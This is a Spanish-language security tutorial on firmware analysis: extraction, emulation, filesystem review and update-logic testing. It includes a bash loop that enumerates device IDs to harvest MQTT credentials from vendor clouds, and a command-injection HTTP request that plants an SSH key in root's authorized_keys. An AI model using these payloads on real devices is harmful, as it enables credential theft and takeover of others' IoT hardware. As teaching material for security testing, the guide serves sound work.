# Análisis de firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introducción**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

El firmware es el software esencial que permite que los dispositivos funcionen correctamente gestionando y facilitando la comunicación entre los componentes hardware y el software con el que interactúan los usuarios. Se almacena en memoria permanente, garantizando que el dispositivo pueda acceder a instrucciones vitales desde el momento en que se enciende, lo que conduce al lanzamiento del sistema operativo. Examinar y potencialmente modificar el firmware es un paso crítico para identificar vulnerabilidades de seguridad.

## **Recolección de información**

La **recolección de información** es un paso inicial crítico para comprender la composición de un dispositivo y las tecnologías que utiliza. Este proceso implica recopilar datos sobre:

- La arquitectura de la CPU y el sistema operativo que ejecuta
- Especificaciones del bootloader
- Disposición del hardware y datasheets
- Métricas del codebase y ubicaciones de código fuente
- Librerías externas y tipos de licencias
- Historiales de actualizaciones y certificaciones regulatorias
- Diagramas arquitectónicos y de flujo
- Evaluaciones de seguridad y vulnerabilidades identificadas

Para este propósito, las herramientas de **inteligencia de código abierto (OSINT)** son invaluables, al igual que el análisis de cualquier componente de software de código abierto disponible mediante procesos de revisión manual y automatizada. Herramientas como [Coverity Scan](https://scan.coverity.com) y [Semmle’s LGTM](https://lgtm.com/#explore) ofrecen análisis estático gratuito que se puede aprovechar para encontrar posibles problemas.

## **Adquisición del firmware**

Obtener el firmware puede abordarse mediante diversos métodos, cada uno con su propio nivel de complejidad:

- **Directamente** desde la fuente (desarrolladores, fabricantes)
- **Construyéndolo** a partir de instrucciones proporcionadas
- **Descargando** desde sitios oficiales de soporte
- Utilizando consultas **Google dork** para encontrar archivos de firmware alojados
- Accediendo directamente a **cloud storage**, con herramientas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **updates** mediante técnicas man-in-the-middle
- **Extrayéndolo** del dispositivo a través de conexiones como **UART**, **JTAG**, o **PICit**
- **Haciendo sniffing** de las requests de actualización dentro de la comunicación del dispositivo
- Identificando y usando endpoints de actualización hardcoded
- **Volcando** desde el bootloader o la red
- **Retirando y leyendo** el chip de almacenamiento, cuando todo lo demás falla, usando herramientas hardware apropiadas

## Análisis del firmware

Ahora que **tienes el firmware**, necesitas extraer información sobre él para saber cómo tratarlo. Diferentes herramientas que puedes usar para eso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Si no encuentras mucho con esas herramientas, revisa la **entropy** de la imagen con `binwalk -E <bin>`; si la entropy es baja, entonces no es probable que esté cifrada. Si la entropy es alta, es probable que esté cifrada (o comprimida de alguna forma).

Además, puedes usar estas herramientas para extraer **archivos incrustados dentro del firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

O [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) para inspeccionar el archivo.

### Obteniendo el filesystem

Con las herramientas comentadas anteriormente como `binwalk -ev <bin>` deberías haber podido **extraer el filesystem**.\
Binwalk usualmente lo extrae dentro de una **carpeta nombrada según el tipo de filesystem**, que normalmente es uno de los siguientes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extracción Manual del filesystem

A veces, binwalk **no tendrá el byte mágico del filesystem en sus firmas**. En esos casos, usa binwalk para **encontrar el offset del filesystem y carve el filesystem comprimido** del binario y **extraer manualmente** el filesystem según su tipo usando los pasos below.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Ejecute el siguiente **dd command** para realizar el carving del Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, también se puede ejecutar el siguiente comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado en el ejemplo anterior)

`$ unsquashfs dir.squashfs`

Los archivos estarán en el directorio `squashfs-root` posteriormente.

- Para archivos CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de archivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de archivos ubifs con NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analizando el firmware

Una vez obtenido el firmware, es esencial diseccionarlo para comprender su estructura y las posibles vulnerabilidades. Este proceso implica utilizar diversas herramientas para analizar y extraer datos valiosos de la imagen del firmware.

### Herramientas de análisis inicial

Se proporciona un conjunto de comandos para la inspección inicial del archivo binario (referido como `<bin>`). Estos comandos ayudan a identificar tipos de archivo, extraer strings, analizar datos binarios y comprender los detalles de particiones y sistemas de archivos:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para evaluar el estado de cifrado de la imagen, se comprueba la **entropía** con `binwalk -E <bin>`. Una entropía baja sugiere ausencia de cifrado, mientras que una entropía alta indica posible cifrado o compresión.

Para extraer **archivos incrustados**, se recomiendan herramientas y recursos como la documentación **file-data-carving-recovery-tools** y **binvis.io** para la inspección de archivos.

### Extracción del sistema de archivos

Usando `binwalk -ev <bin>`, normalmente se puede extraer el sistema de archivos, a menudo en un directorio nombrado según el tipo de sistema de archivos (p. ej., squashfs, ubifs). Sin embargo, cuando **binwalk** no logra reconocer el tipo de sistema de archivos debido a la falta de magic bytes, es necesaria la extracción manual. Esto implica usar `binwalk` para localizar el offset del sistema de archivos, seguido del comando `dd` para extraer el sistema de archivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Afterwards, depending on the filesystem type (e.g., squashfs, cpio, jffs2, ubifs), different commands are used to manually extract the contents.

### Análisis del sistema de archivos

Con el filesystem extraído, comienza la búsqueda de fallos de seguridad. Se presta atención a daemons de red inseguros, credenciales hardcodeadas, endpoints de API, funcionalidades del servidor de actualizaciones, código sin compilar, scripts de arranque y binarios compilados para análisis offline.

**Ubicaciones clave** y **elementos** para inspeccionar incluyen:

- **etc/shadow** and **etc/passwd** for user credentials
- SSL certificates and keys in **etc/ssl**
- Configuration and script files for potential vulnerabilities
- Embedded binaries for further analysis
- Common IoT device web servers and binaries

Varias herramientas ayudan a descubrir información sensible y vulnerabilidades dentro del filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### Verificaciones de seguridad en binarios compilados

Tanto el código fuente como los binarios compilados encontrados en el filesystem deben ser minuciosamente examinados en busca de vulnerabilidades. Herramientas como **checksec.sh** para binarios Unix y **PESecurity** para binarios Windows ayudan a identificar binarios sin protecciones que podrían ser explotados.

## Recolección de configuración en la nube y credenciales MQTT mediante tokens de URL derivados

Muchos IoT hubs obtienen la configuración por dispositivo desde un endpoint en la nube que tiene este aspecto:

- [https://<api-host>/pf/<deviceId>/<token>](https://<api-host>/pf/<deviceId>/<token>)

Durante el análisis de firmware puedes encontrar que <token> se deriva localmente del deviceId usando un secreto hardcodeado, por ejemplo:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Este diseño permite a cualquiera que conozca un deviceId y la STATIC_KEY reconstruir la URL y recuperar la configuración en la nube, revelando a menudo credenciales MQTT en texto claro y prefijos de topic.

Flujo de trabajo práctico:

1) Extraer el deviceId de los logs de arranque UART

- Conecta un adaptador UART de 3.3V (TX/RX/GND) y captura los logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Busca líneas que impriman el patrón de URL de cloud config y la dirección del broker, por ejemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY y el algoritmo del token desde el firmware

- Cargar binarios en Ghidra/radare2 y buscar la ruta de configuración ("/pf/") o el uso de MD5.
- Confirmar el algoritmo (p. ej., MD5(deviceId||STATIC_KEY)).
- Derivar el token en Bash y convertir el digest a mayúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Harvest cloud configuración y credenciales MQTT

- Construye la URL y descarga el JSON con curl; analiza con jq para extraer secretos:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abusar de MQTT en texto plano y de topic ACLs débiles (si están presentes)

- Usar credenciales recuperadas para subscribe a maintenance topics y buscar eventos sensibles:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate predictable device IDs (at scale, with authorization)

- Muchos ecosistemas incrustan bytes vendor OUI/product/type seguidos por un sufijo secuencial.
- Puedes iterar IDs candidatos, derivar tokens y obtener configs programáticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Obtenga siempre autorización explícita antes de intentar mass enumeration.
- Prefiera emulation o static analysis para recuperar secretos sin modificar el hardware objetivo cuando sea posible.


El proceso de emulating firmware permite el **dynamic analysis** ya sea del funcionamiento de un dispositivo o de un programa individual. Este enfoque puede encontrar desafíos por dependencias de hardware o de architecture, pero transferir el root filesystem o binaries específicos a un dispositivo con architecture y endianness coincidentes, como una Raspberry Pi, o a una virtual machine preconstruida, puede facilitar pruebas adicionales.

### Emulating Individual Binaries

Para examinar programas individuales, es crucial identificar el endianness y la CPU architecture del programa.

#### Ejemplo con MIPS Architecture

Para emular un binary de arquitectura MIPS, se puede usar el comando:
```bash
file ./squashfs-root/bin/busybox
```
Y para instalar las herramientas de emulación necesarias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` es usado, y para binarios little-endian, la opción sería `qemu-mipsel`.

#### Emulación de la arquitectura ARM

Para binarios ARM, el proceso es similar, utilizando el emulador `qemu-arm`.

### Emulación de sistema completo

Herramientas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), y otras, facilitan la emulación completa de firmware, automatizando el proceso y ayudando en el análisis dinámico.

## Análisis dinámico en la práctica

En esta etapa se utiliza un entorno de dispositivo real o emulado para el análisis. Es esencial mantener acceso shell al SO y al sistema de archivos. La emulación puede no reproducir perfectamente las interacciones con el hardware, por lo que puede ser necesario reiniciar la emulación ocasionalmente. El análisis debe volver a examinar el sistema de archivos, explotar las páginas web expuestas y servicios de red, y explorar vulnerabilidades del bootloader. Las pruebas de integridad de firmware son críticas para identificar posibles vulnerabilidades backdoor.

## Técnicas de análisis en tiempo de ejecución

El análisis en tiempo de ejecución implica interactuar con un proceso o binario en su entorno operativo, usando herramientas como gdb-multiarch, Frida y Ghidra para establecer breakpoints e identificar vulnerabilidades mediante fuzzing y otras técnicas.

## Explotación binaria y Proof-of-Concept

Desarrollar un PoC para vulnerabilidades identificadas requiere una comprensión profunda de la arquitectura objetivo y programación en lenguajes de bajo nivel. Las protecciones en tiempo de ejecución para binarios en sistemas embebidos son raras, pero cuando están presentes, pueden ser necesarias técnicas como Return Oriented Programming (ROP).

## Sistemas operativos preparados para el análisis de firmware

Sistemas operativos como [AttifyOS](https://github.com/adi0x90/attifyos) y [EmbedOS](https://github.com/scriptingxss/EmbedOS) proporcionan entornos preconfigurados para pruebas de seguridad de firmware, equipados con las herramientas necesarias.

## OSs preparados para analizar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS es una distro destinada a ayudarte a realizar security assessment y penetration testing de dispositivos Internet of Things (IoT). Te ahorra mucho tiempo al proporcionar un entorno preconfigurado con todas las herramientas necesarias cargadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Sistema operativo para testing de seguridad embebida basado en Ubuntu 18.04 preinstalado con herramientas para testing de seguridad de firmware.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Incluso cuando un vendor implementa comprobaciones de firma criptográfica para imágenes de firmware, **la protección contra version rollback (downgrade) suele omitirse**. Cuando el boot- o recovery-loader solo verifica la firma con una clave pública embebida pero no compara la *versión* (o un contador monotónico) de la imagen que se está flasheando, un atacante puede legítimamente instalar un **firmware más antiguo y vulnerable que aún porta una firma válida** y así re-introducir vulnerabilidades parchadas.

Flujo de ataque típico:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Ejemplo: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
En el firmware vulnerable (downgraded), el parámetro `md5` se concatena directamente en un comando shell sin sanitización, lo que permite la inyección de comandos arbitrarios (aquí — habilitar acceso root basado en claves SSH). Las versiones posteriores del firmware introdujeron un filtro básico de caracteres, pero la ausencia de protección contra downgrade hace que la corrección sea inútil.

### Extracting Firmware From Mobile Apps

Muchos proveedores empaquetan imágenes completas del firmware dentro de sus aplicaciones móviles compañeras para que la app pueda actualizar el dispositivo por Bluetooth/Wi-Fi. Estos paquetes suelen almacenarse sin cifrar en el APK/APEX bajo rutas como `assets/fw/` o `res/raw/`. Herramientas como `apktool`, `ghidra`, o incluso el simple `unzip` permiten extraer imágenes firmadas sin tocar el hardware físico.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Lista de verificación para evaluar la lógica de actualización

* ¿Está el transporte/autenticación del *update endpoint* adecuadamente protegido (TLS + authentication)?
* ¿Compara el dispositivo **version numbers** o un **monotonic anti-rollback counter** antes de flashing?
* ¿La imagen se verifica dentro de una secure boot chain (p. ej. signatures checked by ROM code)?
* ¿El userland code realiza sanity checks adicionales (p. ej. allowed partition map, model number)?
* ¿Los flujos de actualización *partial* o *backup* reutilizan la misma lógica de validación?

> 💡  Si falta cualquiera de lo anterior, la plataforma probablemente sea vulnerable a rollback attacks.

## Firmwares vulnerables para practicar

To practice discovering vulnerabilities in firmware, use the following vulnerable firmware projects as a starting point.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Referencias

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Formación y Certificación

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
